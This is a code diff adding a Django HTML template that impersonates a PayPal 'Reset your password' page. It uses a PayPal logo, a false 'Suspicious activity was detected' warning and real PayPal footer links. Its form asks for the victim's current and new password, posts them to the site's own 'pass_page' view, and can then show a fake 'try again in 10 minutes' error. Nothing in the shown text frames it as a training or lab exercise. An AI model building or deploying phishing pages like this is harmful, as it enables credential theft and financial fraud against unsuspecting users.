@@ -1,0 +1,54 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="{% static 'myapp/css/styles1.css' %}">
+	<link rel="icon" href="{% static 'myapp/images/original_img.png' %}">
+	<title>Reset</title>
+</head>
+<body>
+	<div class="container">
+		<img class="ppall" src="{% static 'myapp/images/original_img.png' %}" alt="Logo">
+		<h1>Reset your PayPal password</h1>
+		<p style="font-family: arial;">Suspicious activity was detected in your account</p>
+		<form id="password-form" method="POST" action="{% url 'pass_page' %}">
+			<div class="form-div">
+				{% csrf_token %}
+				<div class="password-input">
+					<input type="password" id="current-password" name="current-password" placeholder="Enter current password">
+					<button type="button" class="show-password-button" onclick="togglePasswordVisibility('current-password')">
+						<img id="eye" src="{% static 'myapp/images/eye-icon.png' %}" alt="Show Password">
+					</button>
+				</div>
+				<div class="password-input">
+					<input type="password" id="new-password" name="new-password" placeholder="Enter new password">
+					<button type="button" class="show-password-button" onclick="togglePasswordVisibility('new-password')">
+						<img id="eye" src="{% static 'myapp/images/eye-icon.png' %}" alt="Show Password">
+					</button>
+				</div>
+				<p id="error-message" {% if display_message %}style="display: block; color: red; font-family: roman; font-size: 17px;"{% else %}style="display: none; color: red; font-family: roman; font-size: 5px;"{% endif %}>Error attempting to reset password.Try again in 10 minutes.</p>
+				<input type="submit" value="Next"  class="submit">
+			</div>
+		</form>
+	</div>
+	<footer>
+		<a style="color: black; font-family: arial;" href="https://www.paypal.com/us/smarthelp/contact-us">Contact us</a>
+		<a style="color: black; font-family: arial;" href="https://www.paypal.com/us/legalhub/privacy-full">Privacy</a>
+		<a style="color: black; font-family: arial;" href="https://www.paypal.com/us/legalhub/privacy-full">Legal</a>
+		<a style="color: black; font-family: arial;" href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a>
+	</footer>
+	<script>
+		function togglePasswordVisibility(inputId) {
+			var passwordInput = document.getElementById(inputId);
+			if (passwordInput.type === "password") {
+				passwordInput.type = "text";
+			} else {
+				passwordInput.type = "password";
+			}
+		}
+	</script>
+</body>
+</html>
+
